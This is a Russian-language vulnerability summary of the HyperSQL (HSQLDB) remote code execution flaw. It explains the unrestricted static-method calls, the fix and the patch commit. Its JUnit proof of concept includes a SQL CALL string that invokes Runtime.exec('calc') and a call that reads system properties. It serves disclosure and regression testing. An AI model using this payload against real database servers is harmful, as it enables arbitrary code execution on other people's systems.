# Обзор #

## Описание уязвимости на github asvisory: ##
https://github.com/advisories/GHSA-77xx-rxvh-q682

## Описание уязвимости: ##
Те, кто использует java.sql.Statement или java.sql.PreparedStatement в hsqldb (HyperSQL DataBase) для обработки ненадежных входных данных, могут быть уязвимы для атаки удаленного выполнения кода. По умолчанию разрешено вызывать любой статический метод любого класса Java в classpath, что приводит к выполнению кода. Проблему можно предотвратить, обновив систему до версии 2.7.1 или установив системное свойство "hsqldb.method_class_names" для классов, которые разрешено вызывать.

## public метод пакета приводящий к уязвимости ##

При accessibleJavaMethodNames == null, всегда возвращалось true, что позволяло вызывать любые статические методы без ограничения

### class HsqlDatabaseProperties ###

~~~java
public static boolean supportsJavaMethod(String var0)
~~~

### Репозиторий проекта с уязвимостью: ###
https://github.com/ryenus/hsqldb

## PoC: ##
~~~java
private static Connection conn;

    @BeforeClass
    public static void setUp() throws Exception {
        Class.forName("org.hsqldb.jdbc.JDBCDriver");
        conn = DriverManager.getConnection("jdbc:hsqldb:mem:testdb", "SA", "");
    }

    @AfterClass
    public static void tearDown() throws Exception {
        conn.createStatement().execute("SHUTDOWN");
        conn.close();
    }

    @Test(expected = SQLException.class)
    public void testUnsafeCallFailsAfterPatch() throws Exception {
        System.setProperty("hsqldb.method_class_names", "java.lang.Math");

        Statement stmt = conn.createStatement();
        stmt.execute("CALL \"java.lang.Runtime.getRuntime().exec('calc')\"");
    }

    @Test
    public void testUnsafeCallSucceedsOnVulnerableVersion() throws Exception {
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery("CALL \"java.lang.System.getProperty\"('os.name')");
        Assert.assertTrue(rs.next());
        String os = rs.getString(1);
        Assert.assertNotNull(os);
    }
~~~

## Коммиты, исправившие уязвимость: ##
https://sourceforge.net/p/hsqldb/svn/6614/
